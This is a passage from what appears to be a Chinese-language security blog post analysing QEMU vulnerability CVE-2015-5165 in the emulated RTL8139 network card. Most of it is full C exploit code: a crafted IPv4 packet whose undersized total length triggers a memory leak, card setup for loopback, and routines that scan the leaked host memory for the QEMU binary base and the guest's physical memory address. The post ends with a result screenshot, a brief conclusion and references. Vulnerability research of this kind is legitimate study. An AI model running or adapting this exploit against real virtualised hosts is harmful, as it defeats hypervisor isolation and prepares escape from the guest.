mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_COUNT 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE_MASK ~7ull</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> scan_leaked_chunks(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count,</span><br><span class="line">                          <span class="keyword">size_t</span> chunk_size, <span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> chunk_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ethernet Frame Header: 14 +</span></span><br><span class="line">        <span class="comment">// IP Header: 20 +</span></span><br><span class="line">        <span class="comment">// TCP Header: 20 = 54</span></span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> size = *(<span class="keyword">uint64_t</span>*)ptr &amp; CHUNK_SIZE_MASK;</span><br><span class="line">            <span class="keyword">if</span> (size == chunk_size) </span><br><span class="line">            &#123;</span><br><span class="line">                chunks[count++] = (<span class="keyword">void</span>*)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; chunk_count) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_module_base_addr(<span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_bool_offset = <span class="number">0x377F66</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0x00000FFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)chunks[i] + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr &amp; mask) == (property_get_bool_offset &amp; mask)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"property_get_bool: 0x%"</span> PRIx64 <span class="string">"\n"</span>, *ptr);</span><br><span class="line">            <span class="keyword">return</span> *ptr - property_get_bool_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_physical_memory_addr(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ull;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span>*)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) </span><br><span class="line">                &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="keyword">void</span>* chunks[CHUNK_COUNT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">size_t</span> chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb, </span><br><span class="line">                                            <span class="number">0x60</span>, chunks, CHUNK_COUNT);</span><br><span class="line">    <span class="keyword">uint64_t</span> module_addr = leak_module_base_addr(chunks, chunk_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"qemu-system-x86_64: 0x%"</span> PRIx64 <span class="string">"\n"</span>, module_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_memory_addr = leak_physical_memory_addr(</span><br><span class="line">        rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"physical memory address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, physical_memory_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Exploit 测试结果如下：</p>
<p><img src="/uploads/202006/cve-2015-5165-exploit.png" alt="QEMU 漏洞 CVE-2015-5165 Exploit"></p>
<h2 id="0x05-分析小结"><a href="#0x05-分析小结" class="headerlink" title="0x05. 分析小结"></a>0x05. 分析小结</h2><p>第一次分析 QEMU 的漏洞，整体感觉还挺有意思的，CVE-2015-5165 这个漏洞本身简单易懂，如果了解网卡基本工作原理的话，Exploit 编写也不是很难。</p>
<h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06. 参考文献"></a>0x06. 参考文献</h2><p>[1] <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p>
<p>[2] <a href="http://patchwork.ozlabs.org/project/qemu-devel/patch/20161228200433.24244-1-cov@codeaurora.org/" target="_blank" rel="noopener">QEMU commands-posix.c patch - &lt;sys/sysmacros.h&gt;</a></p>
<p>[3] <a href="https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/</a></p>
<p>[4] <a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener">https://www.realvnc.com/en/connect/download/viewer/</a></p>
<p>[5] <a href="https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/" target="_blank" rel="noopener">https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/</a></p>
<p>[6] <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p>
<p>[7] TCP/IP Illustrated, Volum 1, The protocols, Second Edition, Kevin R. Fall, W. Richard Stevens</p>
<p>[8] <a href="http://realtek.info/pdf/rtl8139cp.pdf" target="_blank" rel="noopener">http://realtek.info/pdf/rtl8139cp.pdf</a></p>
<p>[9] <a href="https://www.anquanke.com/post/id/197637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>请作者喝杯咖啡☕</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/uploads/wechatpay.jpg" alt="Ke Liu WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/QEMU/" rel="tag"># QEMU</a>
          
            <a href="/tags/RTL8139/" rel="tag"># RTL8139</a>
          
            <a href="/tags/CVE-2015-5165/" rel="tag"># CVE-2015-5165</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/05/20/introduction-to-hypercall/" rel="next" title="Introduction to Hypercall">
                <i class="fa fa-chevron-left"></i> Introduction to Hypercall
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/09/12/ubuntu-snap-docker-registry-mirrors/" rel="prev" title="Ubuntu Snap Docker 国内加速镜像设置">
                Ubuntu Snap Docker 国内加速镜像设置 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
